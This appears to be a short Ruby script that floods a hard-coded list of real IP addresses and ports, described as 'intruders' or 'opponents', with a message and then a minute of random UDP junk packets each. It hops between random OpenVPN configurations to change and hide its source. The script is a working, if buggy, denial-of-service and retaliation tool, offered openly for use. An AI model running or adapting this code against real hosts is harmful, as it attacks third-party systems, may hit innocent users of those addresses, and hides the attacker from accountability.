#! /usr/bin/ruby

#------------------------------------------------------
# Open a socket, start up OpenVPN using a random config
# file, send you message, pound your opponents for a minute
# with random data, teardown you OpenVPN connection and
# start over again at a new random place in the world
# Hop, hop, hop, one-time pad for all configuratons
#------------------------------------------------------

require 'socket'
require 'Random'

# update path here
soc = UDPSocket.new
msg = IO.readlines("<path>/msg.txt")

# IP address, port hash table for destinations
address = { "37.49.224.49" => 56025,
            "43.251.158.103" => 47659,
            "93.157.62.102" => 43666,
            "87.251.74.25" => 48003,
            "125.64.94.131" => 51455,
            "78.128.113.42" => 57939,
            "94.102.51.17" => 43416,
            "13.53.173.212" => 80,
            "45.145.67.143" => 54364,
            "185.175.93.14" => 58669 }

# get all OpenVPN configurations (update here)
configs = Dir.glob("<path>/openvpn/**/*")

# for all OpenVPN configurations
configs.size.times do

  # variables
  idx = 0
  attempts = 0
  status = false

  # choose a unique random configuration
  nxtcfg = configs.sample

  # open next OpenVPN site
  while !status && attempts!=10
    status = `openvpn --config #{nxtcfg}`
    attempts = attempts+1
    puts "OpenVPN status #{status} on attempt #{attempts}"
  end
  
  # hammer the intruders
  address.each do |ip,port|

    if status
  
      puts "Sending to #{ip} on port #{port}"
  
      # send the message notice
      msg.each do |sendit|
        soc.send sendit.to_s, 0, ip.to_s, port.to_i
      end
  
      while idx != 600
        # send random junk for 1 minute (600 random packets of 50..500 bytes)
        nxtmsg = Random.bytes(Random.rand(50..1000));
        soc.send nxtmsg.to_s, 0, ip.to_s, port.to_i
        sleep 0.1
        idx = idx+1
      end
  
      # close the socket
      soc.close
  
    end

  end

  # terminate all OpenVPN connections
  `killall -TERM openvpn`
  
end

